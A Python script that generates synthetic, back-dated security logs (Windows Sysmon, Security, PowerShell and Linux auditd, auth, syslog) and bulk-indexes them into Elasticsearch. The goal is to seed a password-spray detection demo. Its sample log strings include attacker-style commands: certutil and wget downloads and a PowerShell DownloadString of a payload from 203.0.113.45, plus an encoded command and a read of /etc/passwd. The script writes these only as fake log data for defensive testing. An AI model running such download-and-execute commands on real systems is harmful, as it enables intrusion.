#!/usr/bin/env python3
"""Synthetic security log backfill generator (stdlib only).

Bulk-indexes back-dated ECS documents into logs-<dataset>-default data streams using
`create` actions, following config/backfill-schema.md. Every document carries the tag
"synthetic-backfill" so it can be told apart from live Agent data.

Connection settings come from the environment (set by scripts/backfill.sh):
  ES_URL, ES_USER, ES_PASS

The random content is deterministic for a given --seed; only the time window
(ending "now" by default) moves between runs.

Note on lifecycle: this targets Elastic Cloud Serverless, which has no tiers or ILM.
Retention comes from the data stream lifecycle (config/component-template-security-logs-lifecycle.json).
"""
import argparse
import base64
import datetime as dt
import json
import os
import random
import ssl
import sys
import time
import urllib.error
import urllib.request

# dataset -> (os, share of total documents)
DATASETS = {
    "windows.sysmon_operational": ("windows", 0.40),
    "system.security": ("windows", 0.20),
    "windows.powershell_operational": ("windows", 0.10),
    "auditd_manager.auditd": ("linux", 0.15),
    "system.auth": ("linux", 0.10),
    "system.syslog": ("linux", 0.05),
}

WIN_HOSTS = [("win-wks-%02d" % i, "10.20.1.%d" % (10 + i)) for i in range(1, 6)]
LNX_HOSTS = [("lnx-wks-%02d" % i, "10.20.2.%d" % (10 + i)) for i in range(1, 6)]
USERS = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan",
         "judy", "mallory", "svc_backup", "svc_deploy", "administrator", "root"]
BAD_IPS = ["203.0.113.45", "198.51.100.77", "192.0.2.123"]
GOOD_IPS = ["10.20.0.%d" % i for i in range(5, 40)]
# Attack patterns planted for the ES|QL "spray then success" demo query:
# SPRAY_IP tries many different users (password spraying), BRUTE_IP hammers one account.
# Both eventually log on successfully (a small share of burst documents are successes,
# stamped a few minutes after the failures start).
SPRAY_IP, BRUTE_IP = BAD_IPS[0], BAD_IPS[1]
COMPROMISING_IPS = (SPRAY_IP, BRUTE_IP)

WIN_PROCS = [
    ("chrome.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe", "explorer.exe"),
    ("outlook.exe", r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "explorer.exe"),
    ("teams.exe", r"C:\Users\{u}\AppData\Local\Microsoft\Teams\current\Teams.exe", "explorer.exe"),
    ("cmd.exe", r"C:\Windows\System32\cmd.exe", "explorer.exe"),
    ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "explorer.exe"),
    ("whoami.exe", r"C:\Windows\System32\whoami.exe", "cmd.exe"),
    ("ipconfig.exe", r"C:\Windows\System32\ipconfig.exe", "cmd.exe"),
    ("net.exe", r"C:\Windows\System32\net.exe", "cmd.exe"),
    ("tasklist.exe", r"C:\Windows\System32\tasklist.exe", "cmd.exe"),
    ("svchost.exe", r"C:\Windows\System32\svchost.exe", "services.exe"),
    ("certutil.exe", r"C:\Windows\System32\certutil.exe", "cmd.exe"),
    ("rundll32.exe", r"C:\Windows\System32\rundll32.exe", "explorer.exe"),
]
WIN_CMDS = {
    "powershell.exe": ["powershell.exe -NoProfile -Command Get-Process",
                       "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1",
                       "powershell.exe -EncodedCommand JABhAD0AMQA="],
    "certutil.exe": ["certutil.exe -urlcache -split -f http://203.0.113.45/a.txt a.txt", "certutil.exe -store My"],
    "net.exe": ["net user", "net localgroup administrators", "net view"],
}
PS_BLOCKS = [
    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
    "Get-ChildItem C:\\Users\\Public -Recurse",
    "Get-Service | Where-Object {$_.Status -eq 'Running'}",
    "Get-EventLog -LogName Security -Newest 50",
    "$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.45/payload.ps1')",
    "powershell -EncodedCommand JABhAD0AMQA=",
    "Invoke-Expression (Get-Content C:\\Temp\\run.txt)",
    "Get-WmiObject Win32_OperatingSystem",
]
LNX_EXECS = [
    ("/usr/bin/ls", "ls -la /home"), ("/usr/bin/cat", "cat /etc/passwd"), ("/usr/bin/ps", "ps aux"),
    ("/usr/bin/curl", "curl -s http://10.20.0.5/health"), ("/usr/bin/python3", "python3 /opt/app/run.py"),
    ("/usr/bin/sudo", "sudo -n true"), ("/usr/bin/id", "id"), ("/usr/bin/whoami", "whoami"),
    ("/usr/bin/wget", "wget http://203.0.113.45/x.sh"), ("/usr/sbin/useradd", "useradd tmpuser"),
    ("/usr/bin/systemctl", "systemctl status sshd"), ("/usr/bin/crontab", "crontab -l"),
]
SYSLOG_MSGS = [
    ("systemd", "Started Session %d of user %s."), ("CRON", "(%s) CMD (/usr/local/bin/backup.sh) [%d]"),
    ("kernel", "[UFW BLOCK] IN=eth0 OUT= SRC=%s DST=10.20.2.11 PROTO=TCP DPT=22"),
    ("NetworkManager", "<info> device (eth0): state change: activated -> activated (%d)"),
    ("systemd-logind", "New session %d of user %s."),
]
WIN_EVENTS = [  # (code, action, category, weight)
    ("4624", "logged-in", "authentication", 55),
    ("4625", "logon-failed", "authentication", 8),
    ("4634", "logged-out", "authentication", 15),
    ("4672", "logged-in-special", "iam", 10),
    ("4720", "added-user-account", "iam", 1),
    ("4724", "reset-password", "iam", 1),
    ("4732", "added-member-to-group", "iam", 2),
    ("4738", "modified-user-account", "iam", 1),
    ("4688", "created-process", "process", 7),
]


class Gen:
    def __init__(self, seed, start, end):
        self.rnd = random.Random(seed)
        self.start = start
        self.end = end
        self.days = max(1, (end - start).days)
        self.bursts = self._plan_bursts()
        self.pid_seq = 1000

    def _plan_bursts(self):
        bursts = []
        for i in range(8):
            day = self.rnd.randint(1, self.days - 1)
            hour = self.rnd.choice([2, 3, 4, 13, 22])
            t0 = self.end - dt.timedelta(days=day) - dt.timedelta(hours=self.rnd.randint(0, 20))
            t0 = t0.replace(hour=hour, minute=self.rnd.randint(0, 40), second=0, microsecond=0)
            bursts.append((t0, BAD_IPS[i % len(BAD_IPS)], "windows" if i % 2 == 0 else "linux",
                           self.rnd.choice(["administrator", "root", "svc_backup", "alice"])))
        return bursts

    def ts(self):
        """Business-hours weighted timestamp within the window."""
        r = self.rnd
        for _ in range(20):
            t = self.start + dt.timedelta(seconds=r.random() * (self.end - self.start).total_seconds())
            wd, h = t.weekday(), t.hour
            p = (0.9 if 8 <= h < 18 else 0.25 if 6 <= h < 22 else 0.06) * (1.0 if wd < 5 else 0.2)
            if r.random() < p:
                return t
        return t

    def common(self, dataset, os_name, t):
        r = self.rnd
        host, ip = r.choice(WIN_HOSTS if os_name == "windows" else LNX_HOSTS)
        doc = {
            "@timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.") + "%03dZ" % (t.microsecond // 1000),
            "data_stream": {"type": "logs", "dataset": dataset, "namespace": "default"},
            "event": {"dataset": dataset,
                      "ingested": (t + dt.timedelta(seconds=r.randint(1, 5))).strftime("%Y-%m-%dT%H:%M:%SZ")},
            "ecs": {"version": "8.11.0"},
            "host": {"name": host, "hostname": host, "ip": [ip],
                     "os": {"type": os_name,
                            "family": "windows" if os_name == "windows" else "debian",
                            "name": "Windows Server 2022 Datacenter" if os_name == "windows" else "Ubuntu"}},
            "tags": ["synthetic-backfill"],
        }
        return doc, host

    def make(self, dataset):
        os_name = DATASETS[dataset][0]
        r = self.rnd
        # ~1.5% of documents come from planned failed-logon bursts
        burst = None
        if dataset in ("system.security", "system.auth") and r.random() < 0.12:
            cand = [b for b in self.bursts if b[2] == os_name]
            if cand:
                burst = r.choice(cand)
        # ~4% of burst documents from a compromising IP are the eventual successful logon
        self.burst_success = bool(burst and burst[1] in COMPROMISING_IPS and r.random() < 0.04)
        t = (burst[0] + dt.timedelta(seconds=r.randint(0, 240))) if burst else self.ts()
        if self.burst_success:
            t += dt.timedelta(minutes=5)
        doc, host = self.common(dataset, os_name, t)
        if burst and burst[1] == SPRAY_IP:
            user = r.choice(USERS)  # spraying: many different accounts from one source
        else:
            user = burst[3] if burst else r.choice(USERS)
        doc["user"] = {"name": user}
        fn = getattr(self, "_" + dataset.replace(".", "_"))
        fn(doc, user, burst, host)
        return doc

    # -- Windows ------------------------------------------------------------------------
    def _system_security(self, doc, user, burst, host):
        r = self.rnd
        if burst and self.burst_success:
            code, action, cat = "4624", "logged-in", "authentication"
        elif burst:
            code, action, cat = "4625", "logon-failed", "authentication"
        else:
            code, action, cat = r.choices(WIN_EVENTS, weights=[e[3] for e in WIN_EVENTS])[0][:3]
        failed = code == "4625"
        outcome = "failure" if failed else "success"
        logon_type = r.choice([3, 10]) if burst else (r.choice([2, 3, 10]) if code in ("4624", "4625") else None)
        doc["event"].update({"code": code, "action": action, "category": [cat],
                             "outcome": outcome, "provider": "Microsoft-Windows-Security-Auditing"})
        doc["winlog"] = {"channel": "Security", "event_id": code}
        if logon_type:
            doc["winlog"]["logon"] = {"type": {2: "Interactive", 3: "Network", 10: "RemoteInteractive"}[logon_type]}
        if failed:
            doc["source"] = {"ip": burst[1] if burst else r.choice(BAD_IPS + GOOD_IPS)}
        elif code == "4624" and logon_type in (3, 10):
            doc["source"] = {"ip": burst[1] if burst else r.choice(GOOD_IPS)}
        doc["message"] = "An account failed to log on." if failed else "Security event %s for user %s" % (code, user)

    def _windows_sysmon_operational(self, doc, user, burst, host):
        r = self.rnd
        name, exe, parent = r.choice(WIN_PROCS)
        exe = exe.replace("{u}", user)
        cmd = r.choice(WIN_CMDS.get(name, [name]))
        code = r.choices(["1", "3", "11"], weights=[70, 15, 15])[0]
        self.pid_seq += r.randint(1, 40)
        doc["event"].update({"code": code, "provider": "Microsoft-Windows-Sysmon",
                             "category": ["process" if code == "1" else "network" if code == "3" else "file"],
                             "type": ["start" if code == "1" else "connection" if code == "3" else "creation"]})
        doc["process"] = {"name": name, "executable": exe, "command_line": cmd, "pid": self.pid_seq,
                          "parent": {"name": parent, "command_line": parent}}
        doc["winlog"] = {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": code}
        doc["message"] = "Process Create: %s" % cmd if code == "1" else "Sysmon event %s: %s" % (code, name)

    def _windows_powershell_operational(self, doc, user, burst, host):
        r = self.rnd
        code = r.choices(["4104", "4103"], weights=[85, 15])[0]
        text = r.choice(PS_BLOCKS)
        doc["event"].update({"code": code, "provider": "Microsoft-Windows-PowerShell", "category": ["process"]})
        doc["powershell"] = {"file": {"script_block_text": text}}
        doc["winlog"] = {"channel": "Microsoft-Windows-PowerShell/Operational", "event_id": code}
        doc["message"] = "Creating Scriptblock text: %s" % text

    # -- Linux --------------------------------------------------------------------------
    def _system_auth(self, doc, user, burst, host):
        r = self.rnd
        if burst and self.burst_success:
            kind = "ssh_login"
        elif burst:
            kind = "ssh_login_failed"
        else:
            kind = r.choices(["ssh_login", "ssh_login_failed", "sudo"], weights=[45, 15, 40])[0]
        doc["event"].update({"category": ["authentication"], "action": kind,
                             "outcome": "failure" if kind == "ssh_login_failed" else "success"})
        if kind == "sudo":
            doc["process"] = {"name": "sudo"}
            doc["message"] = "%s : TTY=pts/0 ; PWD=/home/%s ; USER=root ; COMMAND=/usr/bin/apt update" % (user, user)
        else:
            ip = burst[1] if burst else (r.choice(BAD_IPS) if kind == "ssh_login_failed" else r.choice(GOOD_IPS))
            doc["process"] = {"name": "sshd"}
            doc["source"] = {"ip": ip}
            doc["system"] = {"auth": {"ssh": {"method": r.choice(["password", "publickey"])}}}
            doc["message"] = ("Failed password for %s from %s port %d ssh2" % (user, ip, r.randint(1024, 65000))
                              if kind == "ssh_login_failed"
                              else "Accepted publickey for %s from %s port %d ssh2" % (user, ip, r.randint(1024, 65000)))

    def _system_syslog(self, doc, user, burst, host):
        r = self.rnd
        proc, tmpl = r.choice(SYSLOG_MSGS)
        n = tmpl.count("%")
        if proc == "systemd" or proc == "systemd-logind":
            msg = tmpl % (r.randint(1, 9999), user)
        elif proc == "CRON":
            msg = tmpl % (user, r.randint(100, 99999))
        elif proc == "kernel":
            msg = tmpl % r.choice(BAD_IPS)
        else:
            msg = tmpl % r.randint(1, 10) if n else tmpl
        doc["process"] = {"name": proc}
        doc["event"]["category"] = ["host"]
        doc["message"] = msg

    def _auditd_manager_auditd(self, doc, user, burst, host):
        r = self.rnd
        exe, cmdline = r.choice(LNX_EXECS)
        self.pid_seq += r.randint(1, 40)
        syscall = r.choices(["execve", "openat", "connect"], weights=[80, 12, 8])[0]
        doc["event"].update({"category": ["process"], "action": "executed", "type": ["start"]})
        doc["auditd"] = {"data": {"syscall": syscall}}
        doc["process"] = {"name": os.path.basename(exe), "executable": exe, "args": cmdline.split(),
                          "pid": self.pid_seq, "parent": {"pid": 1 + r.randint(0, 900)}}
        doc["message"] = "type=SYSCALL syscall=%s exe=%s" % (syscall, exe)


def bulk_send(url, auth, lines, ctx):
    req = urllib.request.Request(url + "/_bulk?filter_path=errors,items.*.error,items.*.status",
                                 data=("\n".join(lines) + "\n").encode(),
                                 headers={"Content-Type": "application/x-ndjson", "Authorization": auth},
                                 method="POST")
    for attempt in range(5):
        try:
            with urllib.request.urlopen(req, timeout=120, context=ctx) as resp:
                return json.loads(resp.read())
        except urllib.error.HTTPError as e:
            if e.code in (429, 502, 503, 504) and attempt < 4:
                time.sleep(2 ** attempt)
                continue
            raise SystemExit("ERROR: bulk request failed HTTP %d: %s" % (e.code, e.read()[:300]))
        except urllib.error.URLError as e:
            if attempt < 4:
                time.sleep(2 ** attempt)
                continue
            raise SystemExit("ERROR: cannot reach Elasticsearch: %s" % e)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--docs", type=int, default=2_000_000)
    ap.add_argument("--days", type=int, default=30)
    ap.add_argument("--batch-size", type=int, default=5000)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--dry-run", action="store_true", help="print sample docs and distribution, send nothing")
    args = ap.parse_args()

    end = dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=10)
    start = end - dt.timedelta(days=args.days)
    gen = Gen(args.seed, start, end)
    names = list(DATASETS)
    weights = [DATASETS[n][1] for n in names]

    url = os.environ.get("ES_URL", "").rstrip("/")
    user, pw = os.environ.get("ES_USER", ""), os.environ.get("ES_PASS", "")
    if not args.dry_run and not (url and user and pw):
        raise SystemExit("ERROR: ES_URL, ES_USER and ES_PASS must be set (use scripts/backfill.sh)")
    auth = "Basic " + base64.b64encode(("%s:%s" % (user, pw)).encode()).decode()
    ctx = ssl.create_default_context()

    sent = errors = 0
    counts = {n: 0 for n in names}
    t0 = time.time()
    batch = []
    for i in range(args.docs):
        ds = gen.rnd.choices(names, weights=weights)[0]
        doc = gen.make(ds)
        counts[ds] += 1
        if args.dry_run:
            if i < 6:
                print(json.dumps({"_index": "logs-%s-default" % ds, **doc}, indent=1))
            continue
        batch.append(json.dumps({"create": {"_index": "logs-%s-default" % ds}}))
        batch.append(json.dumps(doc, separators=(",", ":")))
        if len(batch) >= args.batch_size * 2:
            res = bulk_send(url, auth, batch, ctx)
            if res.get("errors"):
                bad = [it for x in res["items"] for it in x.values() if "error" in it]
                errors += len(bad)
                print("WARN: %d item errors in batch, first: %s" % (len(bad), json.dumps(bad[0])[:300]), file=sys.stderr)
            sent += len(batch) // 2
            batch = []
            if errors > max(100, args.docs // 100):
                raise SystemExit("ERROR: too many bulk item errors (%d); aborting. Are the packages installed (configure.sh)?" % errors)
            if (sent // args.batch_size) % 20 == 0:
                rate = sent / max(1, time.time() - t0)
                print("indexed %d/%d (%.0f docs/s)" % (sent, args.docs, rate), file=sys.stderr)
    if batch and not args.dry_run:
        res = bulk_send(url, auth, batch, ctx)
        if res.get("errors"):
            errors += sum(1 for x in res["items"] for it in x.values() if "error" in it)
        sent += len(batch) // 2
    print("window: %s -> %s" % (start.isoformat(), end.isoformat()))
    print("%s %d docs (errors: %d)" % ("generated" if args.dry_run else "indexed", args.docs if args.dry_run else sent, errors))
    for n in names:
        print("  %-36s %d" % (n, counts[n]))
    return 1 if errors else 0


if __name__ == "__main__":
    sys.exit(main())
